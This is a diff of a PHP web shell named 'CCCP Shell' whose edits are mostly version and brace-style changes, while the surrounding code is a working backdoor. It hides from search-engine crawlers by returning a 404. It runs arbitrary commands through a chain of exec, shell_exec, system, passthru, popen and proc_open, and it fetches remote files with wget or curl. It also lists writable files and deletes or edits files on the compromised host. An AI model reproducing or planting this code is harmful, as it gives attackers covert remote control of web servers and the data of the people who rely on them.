@@ -3,7 +3,7 @@
  *	CCCP Shell
  *	by DSR!
  *	https://github.com/xchwarze/CCCPShell
- *  v 1.0 RC2 06072014
+ *  v 1.0 RC2 08072014
  */
 
 # System variables
@@ -57,7 +57,7 @@ ini_restore('open_basedir');
 @clearstatcache();
 
 $userAgents = array('Google', 'Slurp', 'MSNBot', 'ia_archiver', 'Yandex', 'Rambler', 'Yahoo', 'Zeus', 'bot', 'Wget');
-if ((empty($_SERVER['HTTP_USER_AGENT'])) or (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT']))) {
+if ((empty($_SERVER['HTTP_USER_AGENT'])) or (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT']))){
     header('HTTP/1.0 404 Not Found');
     exit;
 }
@@ -87,21 +87,21 @@ function mSubmit($v, $o, $nl = false){
 		return "<input type='button' value='$v' onclick='$o;return false;'>";
 }
 
-function mSelect($arg) {
+function mSelect($arg){
 	$tmp = '';
 	$arg['onchange'] = isset($arg['onchange']) ? "onchange='$arg[onchange]'" : '';
 	$arg['title'] = isset($arg['title']) ? $arg['title'] : '';
-	if (isset($arg['nokey'])) {
-		foreach ($arg['option'] as $value) {
-			if ($arg['selected']==$value) {
+	if (isset($arg['nokey'])){
+		foreach ($arg['option'] as $value){
+			if ($arg['selected']==$value){
 				$tmp .= "<option value='$value' selected='selected'>$value</option>";
 			} else {
 				$tmp .= "<option value='$value'>$value</option>";
 			}
 		}
 	} else {
-		foreach ($arg['option'] as $key=>$value) {
-			if ($arg['selected'] == $key) {
+		foreach ($arg['option'] as $key=>$value){
+			if ($arg['selected'] == $key){
 				$tmp .= "<option value='$key' selected='selected'>$value</option>";
 			} else {
 				$tmp .= "<option value='$key'>$value</option>";
@@ -128,13 +128,13 @@ function fix_magic_quote($arr){
 	return $arr;
 }
 
-function tText($id, $default) {
+function tText($id, $default){
 	
 	if (isset($lang[$id])) return $lang[$id];
 	else return $default;
 }
 
-function showIcon($file) {
+function showIcon($file){
 	$image = 'unk';
 	$file = strtolower(substr(strrchr($file, '.'), 1));
 	$img = array('htaccess', 'asp', 'cgi', 'php', 'html', 'jpg', 'js', 'swf', 'txt',
@@ -157,9 +157,9 @@ function showIcon($file) {
 	);
 
 	if (in_array($file, $img)) $image = $file;
-	if ($image === 'unk') {
-		foreach ($imgEquals as $k => $v) {
-			if (in_array($file, $v)) {
+	if ($image === 'unk'){
+		foreach ($imgEquals as $k => $v){
+			if (in_array($file, $v)){
 				$image = $k;
 				break;
 			}
@@ -174,65 +174,65 @@ function hsc($s){
 	return htmlspecialchars($s, 2|1);
 }
 
-function execute($c, $i = false) {
+function execute($c, $i = false){
     $v = '';
     $r = '';
 	//$c = $c . ' 2>&1';
     $dis_func = explode(',', get_cfg_var('disable_functions'));
 
-    if ($c) {
-        if (function_exists('exec') && !in_array('exec', $dis_func)) {
+    if ($c){
+        if (function_exists('exec') && !in_array('exec', $dis_func)){
             exec($c, $r);
             $r = implode("\n", $r);
 			//$tmp = '';
 			//if(!empty($r)) foreach($r as $line) $tmp .= $line;
 			//$r = $tmp;
 			$v = 'exec';
-        } elseif (function_exists('shell_exec') && !in_array('shell_exec', $dis_func)) {
+        } elseif (function_exists('shell_exec') && !in_array('shell_exec', $dis_func)){
             $r = @shell_exec($c);
 			$v = 'shell_exec';
-        } elseif (function_exists('system') && !in_array('system', $dis_func)) {
+        } elseif (function_exists('system') && !in_array('system', $dis_func)){
             @ob_start();
             @system($c);
             $r = @ob_get_sBuffs();
             @ob_end_clean();
 			$v = 'system';
-        } elseif (function_exists('passthru') && !in_array('passthru', $dis_func)) {
+        } elseif (function_exists('passthru') && !in_array('passthru', $dis_func)){
             @ob_start();
             @passthru($c);
             $r = @ob_get_sBuffs();
             @ob_end_clean();
 			$v = 'passthru';
-        } elseif (function_exists('popen') && !in_array('popen', $dis_func)) {
+        } elseif (function_exists('popen') && !in_array('popen', $dis_func)){
             $h = popen($c, 'r');
-            if (is_rource($h)) {	
-                if (function_exists('fread') && function_exists('feof')) {
-                    while (!feof($h)) {
+            if (is_rource($h)){	
+                if (function_exists('fread') && function_exists('feof')){
+                    while (!feof($h)){
                         $r .= fread($h, 512);
                     }
-                } elseif (function_exists('fgets') && function_exists('feof')) {
-                    while (!feof($h)) {
+                } elseif (function_exists('fgets') && function_exists('feof')){
+                    while (!feof($h)){
                         $r .= fgets($h, 512);
                     }
                 }
             }
             pclose($h);
 			$v = 'popen';
-        } elseif (function_exists('proc_open') && !in_array('proc_open', $dis_func)) {
+        } elseif (function_exists('proc_open') && !in_array('proc_open', $dis_func)){
             $ds = array(1 => array('pipe', 'w'));
             //$ds = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
             $h = @proc_open($c, $ds, $pipes);
             //$h = @proc_open($c, $ds, $pipes, getcwd(), array());
-            if (is_rource($h)) {
-                if (function_exists('fread') && function_exists('feof')) {
-                    while (!feof($pipes[1])) {
+            if (is_rource($h)){
+                if (function_exists('fread') && function_exists('feof')){
+                    while (!feof($pipes[1])){
                         $r .= fread($pipes[1], 512);
                     }
-                } elseif (function_exists('fgets') && function_exists('feof')) {
-                    while (!feof($pipes[1])) {
+                } elseif (function_exists('fgets') && function_exists('feof')){
+                    while (!feof($pipes[1])){
                         $r .= fgets($pipes[1], 512);
                     }
-					/*while (!feof($pipes[2])) {
+					/*while (!feof($pipes[2])){
                         $r .= fgets($pipes[2], 512);
                     }*/
                 }
@@ -246,36 +246,36 @@ function execute($c, $i = false) {
     return($r);
 }
 
-function safeStatus() {
+function safeStatus(){
     $safe_mode = @ini_get('safe_mode');
     if (!$safe_mode && strpos(execute('echo abcdef'), 'def') != 3) $safe_mode = true;
     return $safe_mode;
 }
 
-function getfun($funName) {
+function getfun($funName){
     return (false !== function_exists($funName)) ? tText('yes', 'yes') : tText('no', 'no');
 }
 
-function getcfg($varname) {
+function getcfg($varname){
     $result = get_cfg_var($varname);
     if ($result == 0) return tText('no', 'no');
     elseif ($result == 1) return tText('yes', 'yes');
     else return $result;
 }
 
-function sizecount($size) {
+function sizecount($size){
 	if ($size[0] === '*') return $size;
 	$sizename = array(' B', ' KB', ' MB', ' GB', ' TB', ' PB', ' EB', ' ZB', ' YB');
 	return @round( $size / pow(1024, ($i = floor(log($size, 1024)))), 2) . $sizename[$i];
 }
 
-function getPath($scriptpath, $nowpath) {
+function getPath($scriptpath, $nowpath){
     if ($nowpath === '.') $nowpath = $scriptpath;
     if (substr($nowpath, -1) !== DS) $nowpath = $nowpath . DS;
     return $nowpath;
 }
 
-function getUpPath($nowpath) {
+function getUpPath($nowpath){
     $pathdb = explode(DS, $nowpath);
     $num = count($pathdb);
     if ($num > 2) unset($pathdb[$num - 1], $pathdb[$num - 2]);
@@ -283,15 +283,15 @@ function getUpPath($nowpath) {
     return $uppath;
 }
 
-function sAjax($i) {
+function sAjax($i){
     exit($i);
 }
 
-function sDialog($i) {
+function sDialog($i){
     return "<br><div id='uires' class='uires'>$i</div><br>";
 }
 
-function sValid($v) {
+function sValid($v){
     if ((isset($v)) && ($v !== '')) return true;
     else return false;
 }
@@ -328,13 +328,13 @@ class PHPZip {
     var $ctrl_dir = array();
     var $old_offset = 0;
 
-    function Zipper($basedir, $filelist) {
+    function Zipper($basedir, $filelist){
 		$curdir = dirname($basedir . $filelist[0]);
-		foreach ($filelist as $filename) {	
+		foreach ($filelist as $filename){	
 			$filename = $basedir . $filename;
-			if (file_exists($filename)) {
+			if (file_exists($filename)){
 				if (is_dir($filename)) $sBuff = $this->GetFileList($filename, $curdir);
-				if (is_file($filename)) {
+				if (is_file($filename)){
 					$fd = fopen($filename, 'r');
 					$sBuff = @fread($fd, filesize($filename));
 					fclose($fd);
@@ -347,12 +347,12 @@ class PHPZip {
         return 1;
     }
 
-    function GetFileList($dir, $curdir) {
-        if (file_exists($dir)) {			
+    function GetFileList($dir, $curdir){
+        if (file_exists($dir)){			
 			$dirPrefix = basename($dir) . DS;
             $dh = opendir($dir);
-            while ($files = readdir($dh)) {
-                if (($files !== '.') && ($files !== '..')) {
+            while ($files = readdir($dh)){
+                if (($files !== '.') && ($files !== '..')){
                     if (is_dir($dir . $files)) $this->GetFileList($dir . $files . DS, $curdir);
                     else {
 						$fd = fopen($dir . $files, 'r');
@@ -367,13 +367,13 @@ class PHPZip {
         return 1;
     }
 
-    function unix2DosTime($unixtime = 0) {
+    function unix2DosTime($unixtime = 0){
         $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);
         if ($timearray['year'] < 1980) $timearray = array('year' => 1980, 'mon' => 1, 'mday' => 1, 'hours' => 0, 'minutes' => 0, 'seconds' => 0);
         return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) | ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
     }
 	
-	function hex2bin($str) {
+	function hex2bin($str){
 		$bin = '';
 		$i = 0;
 		do {
@@ -383,7 +383,7 @@ class PHPZip {
 		return $bin;
 	}
 
-    function addFile($data, $name, $time = 0) {
+    function addFile($data, $name, $time = 0){
 		$packv0 = pack('v', 0);
         $dtime = dechex($this->unix2DosTime($time));
 		$hexdtime = $this->hex2bin($dtime[6] . $dtime[7] . $dtime[4] . $dtime[5] . $dtime[2] . $dtime[3] . $dtime[0] . $dtime[1]);
@@ -417,13 +417,13 @@ class PHPZip {
         $this->ctrl_dir[] = $cdrec;
     }
 
-    function file() {
+    function file(){
         $data = implode('', $this->datasec);
         $ctrldir = implode('', $this->ctrl_dir);
         return $data . $ctrldir . "\x50\x4b\x05\x06\x00\x00\x00\x00" . pack('v', sizeof($this->ctrl_dir)) . pack('v', sizeof($this->ctrl_dir)) . pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "  ";
     }
 
-    function output($file) {
+    function output($file){
         $fp = fopen($file, 'w');
         fwrite($fp, $this->file());
         fclose($fp);
@@ -438,7 +438,7 @@ function compress($type, $archive, $files){
 		} else {
 			
 		}
-	} else if (($type=='tar')||($type=='targz')) {
+	} else if (($type=='tar')||($type=='targz')){
 		$archive = basename($archive);
 		$listsBasename = array_map('basename', $files);
 		$lists = array_map('wrap_with_quotes', $listsBasename);
@@ -458,7 +458,7 @@ function decompress($type, $archive, $path){
 	$path = realpath($path).DIRECTORY_SEPARATOR;
 	if(is_dir($path)){
 		chdir($path);
-		if($type=='unzip') {
+		if($type=='unzip'){
 			if(class_exists('ZipArchive')){
 				$zip = new ZipArchive();
 				$target = $path.basename($archive,'.zip');
@@ -470,14 +470,14 @@ function decompress($type, $archive, $path){
 			} else {
 			
 			}
-		} elseif($type=='untar') {
+		} elseif($type=='untar'){
 			$target = basename($archive,'.tar');
 			if(!is_dir($target)) mkdir($target);
 			$before = count(get_all_files($target));
 			execute('tar xf "'.basename($archive).'" -C "'.$target.'"');
 			$after = count(get_all_files($target));
 			if($before!=$after) return true;
-		} elseif($type=='untargz') {
+		} elseif($type=='untargz'){
 			$target = '';
 			if(strpos(strtolower($archive), '.tar.gz')!==false) $target = basename($archive,'.tar.gz');
 			elseif(strpos(strtolower($archive), '.tgz')!==false) $target = basename($archive,'.tgz');
@@ -501,7 +501,7 @@ function download($url ,$save){
 			return true;
 	}
 	
-	if (!$isWIN) {
+	if (!$isWIN){
 		$buff = execute('wget '.$url.' -O '.$save);
 		if(is_file($save)) return true;
 		$buff = execute('curl '.$url.' -o '.$save);
@@ -515,32 +515,32 @@ function download($url ,$save){
 	return false;
 }
 
-function filesize64($file) {
+function filesize64($file){
 	$size = filesize($file);
-	if ($size > 1610612736 or $size < -1) {
+	if ($size > 1610612736 or $size < -1){
 		/*
 		global $isWIN;
 		$size = 0;
-		if (!safeStatus()) {
+		if (!safeStatus()){
 			$cmd = ($isWIN) ? "for %F in (\"$file\") do @echo %~zF" : "stat -c%s \"$file\"";
 			execute($cmd, $output);
 			ctype_digit($size = trim($output));
 		}
 	
-		if ($isWIN && class_exists("COM")) {
+		if ($isWIN && class_exists("COM")){
 			try {
 				$fsobj = new COM('Scripting.FileSystemObject');
 				$f = $fsobj->GetFile(realpath($file));
 				$size = $f->Size;
-			} catch (Exception $e) {}
+			} catch (Exception $e){}
 		}
 		
 		$piece = 1073741824;
 		$fp = @fopen($file, 'r');
 		@fseek($fp, 0, SEEK_SET);
-		while ($piece > 1) {
+		while ($piece > 1){
 			@fseek($fp, $piece, SEEK_CUR);
-			if (@fgetc($fp) === false) {
+			if (@fgetc($fp) === false){
 				@fseek($fp, -$piece, SEEK_CUR);
 				$piece = (int)($piece / 2);
 			} else {
@@ -568,10 +568,10 @@ $p = fix_magic_quote($_POST);
 if (!empty($_GET)) $p += fix_magic_quote($_GET);
 
 # Validate now
-if ($config['sPass']) {
+if ($config['sPass']){
 	@session_start();
-	if (!isset($_SESSION[ md5($_SERVER['HTTP_HOST']) ])) { 
-		if (isset($p['pa']) && (md5($p['pa']) === $config['sPass'])) { 
+	if (!isset($_SESSION[ md5($_SERVER['HTTP_HOST']) ])){ 
+		if (isset($p['pa']) && (md5($p['pa']) === $config['sPass'])){ 
 			$_SESSION[ md5($_SERVER['HTTP_HOST']) ] = true; 
 		} else {
 			echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">' .
@@ -590,16 +590,16 @@ if ($config['sPass']) {
 }
 	
 # Sections
-if (isset($p['me']) && $p['me'] === 'file') {
+if (isset($p['me']) && $p['me'] === 'file'){
 	$shelldir = getPath(SROOT, '.');
 
-	function dirsize($dir) {
+	function dirsize($dir){
         $f = $s = 0;
         $dh = @opendir($dir);
-        while ($file = @readdir($dh)) {
-			if ($file !== '.' && $file !== '..') {
+        while ($file = @readdir($dh)){
+			if ($file !== '.' && $file !== '..'){
 				$path = $dir . DS . $file;
-				if (@is_dir($path)) {
+				if (@is_dir($path)){
 					$tmp = dirsize($path); 
 					$f = $f + $tmp['f'];  
 					$s = $s + $tmp['s'];  
@@ -613,7 +613,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
         return array ('f' => $f, 's' => $s);
     }
 
-    function getChmod($filepath) {
+    function getChmod($filepath){
         return substr(base_convert(@fileperms($filepath), 10, 8), -4);
     }
 
@@ -638,17 +638,17 @@ if (isset($p['me']) && $p['me'] === 'file') {
 		$world['write'] = ($mode & 00002) ?   'w' : '-'; 
 		$world['execute'] = ($mode & 00001) ? 'x' : '-'; 
 
-		if ($mode & 0x800) {$owner['execute'] = ($owner['execute']==='x') ? 's' : 'S';}
-		if ($mode & 0x400) {$group['execute'] = ($group['execute']==='x') ? 's' : 'S';}
-		if ($mode & 0x200) {$world['execute'] = ($world['execute']==='x') ? 't' : 'T';}
+		if ($mode & 0x800){$owner['execute'] = ($owner['execute']==='x') ? 's' : 'S';}
+		if ($mode & 0x400){$group['execute'] = ($group['execute']==='x') ? 's' : 'S';}
+		if ($mode & 0x200){$world['execute'] = ($world['execute']==='x') ? 't' : 'T';}
 		
 		return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
     }
 
-    function getUser($filepath) {
-		if (function_exists('posix_getpwuid')) {
+    function getUser($filepath){
+		if (function_exists('posix_getpwuid')){
 			$array = @posix_getpwuid(@fileowner($filepath));
-			if ($array && is_array($array)) {
+			if ($array && is_array($array)){
 				return ' / <a href="#" onclick="return false;" title="User: ' . $array['name'] . ' Passwd: ' . $array['passwd']
 					. ' UID: ' . $array['uid'] . '	GID: ' . $array['gid']
 					. ' Gecos: ' . $array['gecos'] . '	Dir: ' . $array['dir']
@@ -658,7 +658,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 		return '';
     }
 	
-	function vPermsColor($t) { 
+	function vPermsColor($t){ 
 		$c = 'mg';
 		if (!is_readable($t))
 			$c = 'mr';
@@ -667,14 +667,14 @@ if (isset($p['me']) && $p['me'] === 'file') {
 		return "<font class='$c'>" . getChmod($t) . '&nbsp;' . getPerms($t) . "</font>";
 	}
 
-    function delTree($path) {
+    function delTree($path){
             $origipath = $path;
             $h = opendir($path);
-            while (true) {
+            while (true){
                 $item = readdir($h);
-                if ($item === '.' or $item === '..') {
+                if ($item === '.' or $item === '..'){
                     continue;
-                } elseif (gettype($item) === 'boolean') {
+                } elseif (gettype($item) === 'boolean'){
                     closedir($h);
                     if (!@rmdir($path))
                         return false;
@@ -684,7 +684,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
                     
                     $path = substr($path, 0, strrpos($path, DS));
                     $h = opendir($path);
-                } elseif (is_dir($path . DS . $item)) {
+                } elseif (is_dir($path . DS . $item)){
                     closedir($h);
                     $path = $path . DS . $item;
                     $h = opendir($path);
@@ -695,12 +695,12 @@ if (isset($p['me']) && $p['me'] === 'file') {
     }
 		
     function recursiveCopy($path, $dest){ 
-		if (is_dir($path)) {
+		if (is_dir($path)){
 			@mkdir($dest);
 			$objects = scandir($path);
-			if (sizeof($objects) > 0) {
-				foreach($objects as $file) {
-					if ($file !== '.' && $file !== '..') {
+			if (sizeof($objects) > 0){
+				foreach($objects as $file){
+					if ($file !== '.' && $file !== '..'){
 						if (is_dir($path.$file))
 							recursiveCopy($path . $file . DS, $dest . DS . $file . DS);
 						else 
@@ -709,26 +709,26 @@ if (isset($p['me']) && $p['me'] === 'file') {
 				}
 			}
 			return true;
-		} elseif(is_file($path)) {
+		} elseif(is_file($path)){
 			return copy($path, $dest);
 		} else {
 			return false;
 		} 
     }
 	
-	function getext($file) {
+	function getext($file){
 		//$info = pathinfo($file);
 		return pathinfo($file, PATHINFO_EXTENSION);
     }
 	
-    function GetWDirList($dir) {
+    function GetWDirList($dir){
             global $dirdata, $j, $shelldir;
             ! $j && $j = 1;
-            if ($dh = opendir($dir)) {
-                while ($file = readdir($dh)) {
+            if ($dh = opendir($dir)){
+                while ($file = readdir($dh)){
                     $f = str_replace('//', '/', $dir . '/' . $file);
-                    if ($file !== '.' && $file !== '..' && is_dir($f)) {
-                        if (is_writable($f)) {
+                    if ($file !== '.' && $file !== '..' && is_dir($f)){
+                        if (is_writable($f)){
                             $dirdata[$j]['filename'] = str_replace($shelldir, '', $f);
                             $dirdata[$j]['mtime'] = @date($config['datetime'], filemtime($f));
                             $dirdata[$j]['dirchmod'] = getChmod($f);
@@ -748,17 +748,17 @@ if (isset($p['me']) && $p['me'] === 'file') {
             }
     }
 
-    function GetWFileList($dir) {
+    function GetWFileList($dir){
             global $filedata, $j, $shelldir, $writabledb;
             ! $j && $j = 1;
-            if ($dh = opendir($dir)) {
-                while ($file = readdir($dh)) {
+            if ($dh = opendir($dir)){
+                while ($file = readdir($dh)){
                     $ext = getext($file);
                     $f = str_replace('//', '/', $dir . '/' . $file);
-                    if ($file !== '.' && $file !== '..' && is_dir($f)) {
+                    if ($file !== '.' && $file !== '..' && is_dir($f)){
                         GetWFileList($f);
-                    } elseif ($file !== '.' && $file !== '..' && is_file($f) && in_array($ext, explode(',', $writabledb))) {
-                        if (is_writable($f)) {
+                    } elseif ($file !== '.' && $file !== '..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
+                        if (is_writable($f)){
                             $filedata[$j]['filename'] = str_replace($shelldir, '', $f);
                             $filedata[$j]['size'] = sizecount(@filesize($f));
                             $filedata[$j]['mtime'] = @date($config['datetime'], filemtime($f));
@@ -779,27 +779,27 @@ if (isset($p['me']) && $p['me'] === 'file') {
             }
     }
 
-    function GetSFileList($dir, $sBuff, $re = 0) {
+    function GetSFileList($dir, $sBuff, $re = 0){
             global $filedata, $j, $shelldir, $writabledb;
             ! $j && $j = 1;
-            if ($dh = opendir($dir)) {
-                while ($file = readdir($dh)) {
+            if ($dh = opendir($dir)){
+                while ($file = readdir($dh)){
                     $ext = getext($file);
                     $f = str_replace('//', '/', $dir . '/' . $file);
-                    if ($file !== '.' && $file !== '..' && is_dir($f)) {
+                    if ($file !== '.' && $file !== '..' && is_dir($f)){
                         GetSFileList($f, $sBuff, $re = 0);
-                    } elseif ($file !== '.' && $file !== '..' && is_file($f) && in_array($ext, explode(',', $writabledb))) {
+                    } elseif ($file !== '.' && $file !== '..' && is_file($f) && in_array($ext, explode(',', $writabledb))){
                         $find = 0;
-                        if ($re) {
-                            if (preg_match('@' . $sBuff . '@', $file) || preg_match('@' . $sBuff . '@', @file_get_sBuffs($f))) {
+                        if ($re){
+                            if (preg_match('@' . $sBuff . '@', $file) || preg_match('@' . $sBuff . '@', @file_get_sBuffs($f))){
                                 $find = 1;
                             }
                         } else {
-                            if (strstr($file, $sBuff) || strstr(@file_get_sBuffs($f), $sBuff)) {
+                            if (strstr($file, $sBuff) || strstr(@file_get_sBuffs($f), $sBuff)){
                                 $find = 1;
                             }
                         }
-                        if ($find) {
+                        if ($find){
                             $filedata[$j]['filename'] = str_replace($shelldir, '', $f);
                             $filedata[$j]['size'] = sizecount(@filesize($f));
                             $filedata[$j]['mtime'] = @date($config['datetime'], filemtime($f));
@@ -820,11 +820,11 @@ if (isset($p['me']) && $p['me'] === 'file') {
             }
     }		
 
-    if (@$p['md'] === 'vs') {
+    if (@$p['md'] === 'vs'){
 		$s = dirsize($p['f']);
 		sAjax(is_numeric($s['s']) ? sizecount($s['s']) . ' (' . $s['f'] . ')' : 'Error?');
-	} elseif (@$p['md'] === 'tools') {
-		switch ($p['ac']) {
+	} elseif (@$p['md'] === 'tools'){
+		switch ($p['ac']){
 			case 'cdir':
 				if (file_exists($p['a'] . $p['b']))
 					sAjax(tText('alredyexists', 'object alredy exists'));
@@ -838,14 +838,14 @@ if (isset($p['me']) && $p['me'] === 'file') {
 					sAjax(tText('alredyexists', 'object alredy exists'));
 				else {
 					$fp = @fopen($p['a'] . $p['b'], 'w');
-					if ($fp) {
+					if ($fp){
 						@fclose($fp);
 						sAjax('OK');
 					} else sAjax(tText('accessdenied', 'Access denied'));
 				}
 				break;
 			case 'comp':
-				if ($p['dl']) {
+				if ($p['dl']){
 					$zip = new PHPZip();
 					$zip->Zipper($p['fl'], $p['dl']);
 					header('sBuff-type: application/octet-stream');
@@ -857,16 +857,16 @@ if (isset($p['me']) && $p['me'] === 'file') {
 				}
 				break;
 			case 'copy': 
-				if ($p['dl']) {
+				if ($p['dl']){
 					$fNames = Array();
 					$total = count($p['dl']);
 					if ($p['b'][(strlen($p['b']) - 1)] !== DS) $p['b'] .= DS; 
-					for ($z = 0; $total > $z; $z++) {
+					for ($z = 0; $total > $z; $z++){
 						$fileinfo = pathinfo($p['fl'] . $p['dl'][$z]);
 						if (!file_exists($p['fl'] . $p['dl'][$z]))
 							sAjax(tText('notexist', 'Object does not exist'));
 						else {
-							if (is_dir($p['fl'] . $p['dl'][$z])) { 
+							if (is_dir($p['fl'] . $p['dl'][$z])){ 
 								if (!@recursiveCopy($p['fl'] . $p['dl'][$z], $p['b'] . $fileinfo['basename'] . DS)) $fNames[] = $p['dl'][$z];
 							} else {
 								if (!@copy($p['fl'] . $p['dl'][$z], $p['b'] . $fileinfo['basename'])) $fNames[] = $p['dl'][$z];
@@ -883,11 +883,11 @@ if (isset($p['me']) && $p['me'] === 'file') {
 					sAjax((is_dir($p['a']) ? @delTree($p['a']) : @unlink($p['a'])) ? 'OK' : tText('fail', 'Fail!'));				
 				break;
 			case 'rdel':
-				if ($p['dl']) {
+				if ($p['dl']){
 					$fNames = Array();
 					$total = count($p['dl']);				
-					for ($z = 0; $total > $z; $z++) {
-						if (is_dir($p['fl'] . $p['dl'][$z])) {
+					for ($z = 0; $total > $z; $z++){
+						if (is_dir($p['fl'] . $p['dl'][$z])){
 							if (!@delTree($p['fl'] . $p['dl'][$z])) $fNames[] = $p['dl'][$z];
 						} else {
 							if (!@unlink($p['fl'] . $p['dl'][$z])) $fNames[] = $p['dl'][$z];
@@ -944,7 +944,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 					sAjax(@rename($p['a'], $p['b']) ? 'OK' : tText('fail', 'Fail!'));
 				break;
 		}
-	} elseif (@$p['md'] === 'info') {			
+	} elseif (@$p['md'] === 'info'){			
 		$sBuff .= '<b>' . tText('information', 'Information') . ': </b>
 					 <table border=0 cellspacing=1 cellpadding=2>
 					 <tr><td><b>' . tText('path', 'Path') . '</b></td><td>' . $p['t'] . '</td></tr>
@@ -955,7 +955,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 					 <tr><td><b>' . tText('atime', 'Access time') . '</b></td><td>' . date($config['datetime'], fileatime($p['t'])) . '</td></tr>
 					 <tr><td><b>' . tText('mtime', 'Modify time') . '</b></td><td>' . date($config['datetime'], filemtime($p['t'])) . '</td></tr>';
 					 
-		if (!$isWIN) {
+		if (!$isWIN){
 			$ow = posix_getpwuid(fileowner($p['t']));
 			$gr = posix_getgrgid(filegroup($p['t']));
 			$sBuff .= '<tr><td><b>' . tText('chmodchown', 'Chmod/Chown') . '</b></td><td>' .
@@ -965,7 +965,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 		$sBuff .= '</table><br>';
 				
 		$fp  = @fopen($p['t'], 'rb');
-		if ($fp) {
+		if ($fp){
 			$sBuff .= '<div data-path="' . $p['t'] . '"><p>
 							[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hl=n&t=\' + euc(dpath(this, false)));">' . tText('hl', 'Highlight') . '</a>]
 							[<a href="#" onclick="ajaxLoad(\'me=file&md=info&hl=p&t=\' + euc(dpath(this, false)));">' . tText('hlp', 'Highlight +') . '</a>]
@@ -974,8 +974,8 @@ if (isset($p['me']) && $p['me'] === 'file') {
 							[<a href="#" onclick="ajaxLoad(\'me=file&md=edit&t=\' + euc(dpath(this, false)));">' . tText('edit', 'Edit') . '</a>]
 						</p></div><br><br>';		
 			
-			if (isset($p['hd'])) {
-				if ($p['hd'] === 'n') {
+			if (isset($p['hd'])){
+				if ($p['hd'] === 'n'){
 					$sBuff .= '<b>Hex Dump</b><br>';
 					$str = fread($fp, filesize($p['t']));
 				} else {
@@ -988,10 +988,10 @@ if (isset($p['me']) && $p['me'] === 'file') {
 				$show_sBuff = '';
 				$counter      = 0;
 				$str_len      = strlen($str);
-				for ($i = 0; $i < $str_len; $i++) {
+				for ($i = 0; $i < $str_len; $i++){
 					$counter++;
 					$show_hex .= sprintf('%02X', ord($str[$i])) . ' ';
-					switch (ord($str[$i])) {
+					switch (ord($str[$i])){
 						case 0 :
 						case 9 :
 						case 10:
@@ -1000,7 +1000,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 							break;
 						default: $show_sBuff .= $str[$i];
 					}
-					if ($counter === $config['hd_rows']) {
+					if ($counter === $config['hd_rows']){
 						$counter = 0;
 						if ($i + 1 < $str_len) 
 							$show_offset .= sprintf('%08X', $i + 1) . '<br>';
@@ -1009,9 +1009,9 @@ if (isset($p['me']) && $p['me'] === 'file') {
 					}
 				}
 				$sBuff .= '<center><table border=0 bgcolor=#666666 cellspacing=1 cellpadding=5><tr><td bgcolor=#666666><pre>' . $show_offset . '</pre></td><td bgcolor=000000><pre>' . $show_hex . '</pre></td><td bgcolor=000000><pre>' . hsc($show_sBuff) . '</pre></td></tr></table></center><br>';
-			} else if (isset($p['hl'])) {
-				if (function_exists('highlight_file')) {
-					if ($p['hl'] === 'n') {
+			} else if (isset($p['hl'])){
+				if (function_exists('highlight_file')){
+					if ($p['hl'] === 'n'){
 						$sBuff .= '<b>Highlight sBuff:</b><br>' .
 									'<div class=ml1 style="background-color: #e1e1e1; color:black;">' . highlight_file($p['t'], true) . '</div>'; 
 					} else {
@@ -1020,7 +1020,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 						$padLength = strlen(count($lines));
 						$sBuff .= '<b>Highlight + sBuff:</b><br><br><div class=ml1 style="background-color: #e1e1e1; color:black;">';
 						
-						foreach($lines as $i => $line) {
+						foreach($lines as $i => $line){
 							$lineNumber = str_pad($i + 1,  $padLength, '0', STR_PAD_LEFT);
 							$sBuff .= sprintf('<span style="color: #999999;font-weight: bold">%s | </span>%s<br>', $lineNumber, $line);
 						}
@@ -1038,8 +1038,8 @@ if (isset($p['me']) && $p['me'] === 'file') {
 			$sBuff .= sDialog(tText('accessdenied', 'Access denied'));
 		
 		@fclose($fp);
-	} elseif (@$p['md'] === 'edit') {
-		if (file_exists($p['t'])) {
+	} elseif (@$p['md'] === 'edit'){
+		if (file_exists($p['t'])){
 			$filemtime = explode('-', @date('Y-m-d-H-i-s', filemtime($p['t'])));
 		
 			$sBuff .= '<h2>' . tText('edit', 'Edit') . '</h2>
@@ -1088,7 +1088,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 				
         // Obtenemos el directorio en el que estamos
 		$currentdir = $shelldir;
-        if (!empty($p['dir'])) {
+        if (!empty($p['dir'])){
 			$p['dir'] = str_replace(array('/', '\\'), DS, $p['dir']);
 			if (substr($p['dir'], -1) !== DS) $p['dir'] = $p['dir'] . DS;
 			$currentdir = $p['dir'];
@@ -1103,7 +1103,7 @@ if (isset($p['me']) && $p['me'] === 'file') {
 		$fp = '';
 		$lnks = '';
 		foreach (explode(DS, $currentdir) as $tmp){
-			if (!empty($tmp) || empty($fp)) {
+			if (!empty($tmp) || empty($fp)){
 				$fp .= $tmp . DS;
 				$lnks .= '<a href="#" data-path="' . $fp .'" onclick="godisk(this);return false;" >' . $tmp . DS . '</a> ';
 			}
@@ -1120,11 +1120,11 @@ if (isset($p['me']) && $p['me'] === 'file') {
 			</table>		
 			<tr class="alt1"><td colspan="7" style="padding:5px;">';
 
-        if ($isWIN) {
+        if ($isWIN){
 			$sBuff .= tText('drive', 'Drive') . ': ';
-			if (class_exists('COM')) {
+			if (class_exists('COM')){
 				$obj = new COM('scripting.filesystemobject');
-				if ($obj && is_object($obj)) {
+				if ($obj && is_object($obj)){
